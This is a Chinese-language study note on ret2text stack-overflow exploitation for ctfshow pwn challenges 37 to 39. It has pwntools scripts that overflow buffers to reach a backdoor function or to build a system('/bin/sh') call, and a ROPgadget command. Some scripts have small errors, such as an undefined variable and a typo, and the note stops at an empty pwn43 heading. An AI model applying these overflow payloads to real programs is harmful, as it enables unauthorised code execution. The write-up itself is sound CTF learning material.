## ctf pwn ret2text

### 基本概念

栈：是存储程序执行期间的本地变量和函数的参数，从高地址向低地址生长

堆：动态内存分配的区域，通过malloc，new，free和delete等函数的管理

数据区：存储在源代码中有预定义值的全局变量和静态变量

代码区：存储只读的程序执行代码，即机器指令

未初始化变量区：存储未被初始化的全局变量和今天变量

#### x86：

​	使用栈传输

#### amd64：

​	前6个参数存放在rdi,rsi,rdx,rcx,r8,r9寄存器中

​	第七个以后的数据放入栈中

---

### ret2test

主要的要点就是通过栈溢出来执行我们想要好的后门函数

#### 例题：ctfshow pwn37

![image-20241116132738455](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116132738455.png)

![image-20241116132747938](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116132747938.png)

而这里确认栈溢出的方法可以多种

可以使用gdb的动态调试同样也可以使用ide pro的静态分析

![image-20241116133026717](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116133026717.png)

而这个用静态分析就可以了

可以发现我们只需要溢出0x12+4个函数

这里会有问题是+4是如何确定的这里我们就可以点金这个变量里面就可以明白了

![image-20241116133158311](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116133158311.png)

这里你要从一个buf变量变成到一个可以读取的权限就要向下溢出到r因此要加4

因此exp：

```python
from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28187)
#elf = ELF('pwn')
#backdoor = elf.sym['backdoor']
payload = 'A'*(0x12+4) + p32(backdoor)
io.sendline(payload)
io.recv()
io.interactive()
```

#### pwn38

但是与32位不同的是，这里需要考虑到堆栈平衡加上ret返回地址。因此exp：

```python
from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show', 28140)
#elf = ELF('./pwn')
#backdoor = elf.sym['backdoor']
ret = 0x400287 # 0x0000000000400287 : ret
payload = b'a'*(0xA+8) + p64(ret) + p64(backdoor)
io.sendline(payload)
io.recv()
io.interactive()
```

---

同样这里也可以使用elf函数去本地文件中寻找地址

---

#### pwn39

这一题是system函数和/bin/sh的字符串的一个分离和组合的题目因此我们的思路是可以使用栈溢出的方法进行对system('/bin/sh')的一种构造

这里要注意system中也是需要一个返回值的因此我们这里要输入一个无关紧要的值来当他的放回地址在把/bin/sh这个字符串给他

因此exp:

```
rom pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28161)
elf = ELF('./pwn')
system = elf.sym['system']
bin_sh = 0x8048750
payload = 'a'*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)
io.sendline(payload)
io.recv()
io.interactive()
```

这里使用ROPgadget可以对字符串进行查找命令为：

```bash
ROPgadget --binary pwn --string "/bin/sh"
```

这里有也可以进行字符串地址的查找

---

#### pwn40

这个可能要用ret2libc的问题

候补

---

#### pwn43